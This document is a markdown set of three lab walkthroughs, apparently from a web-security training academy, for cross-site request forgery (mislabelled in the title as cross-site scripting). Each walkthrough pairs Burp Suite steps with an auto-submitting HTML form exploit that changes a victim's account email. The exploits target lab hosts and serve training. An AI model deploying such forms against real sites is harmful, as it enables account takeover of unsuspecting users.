# Some cases of Cross-site scripting

## 1. CSRF vulnerability with no defenses

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

If you're using Burp Suite Community Edition, use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".

```html
<html>
    <body>
        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="hacker@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".

To verify that the exploit works, try it on yourself by clicking "View exploit" and then check the resulting HTTP request and response.

Change the email address in your exploit so that it doesn't match your own.

Click "Deliver to victim" to solve the lab.

## 2. CSRF where token validation depends on request method

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.

Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.

If you're using Burp Suite Community Edition, use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".

```html
<html>
    <body>
        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
            <input type="hidden" name="email" value="hackers@hacker.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".

To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.

Change the email address in your exploit so that it doesn't match your own.

Store the exploit, then click "Deliver to victim" to solve the lab.

## 3. CSRF where token validation depends on token being present

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

Send the request to Burp Repeater and observe that if you change the value of the `csrf` parameter then the request is rejected.

Delete the `csrf` parameter entirely and observe that the request is now accepted.

if you're using Burp Suite Community Edition, use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
```

Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".

To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.

Change the email address in your exploit so that it doesn't match your own.

Store the exploit, then click "Deliver to victim" to solve the lab.
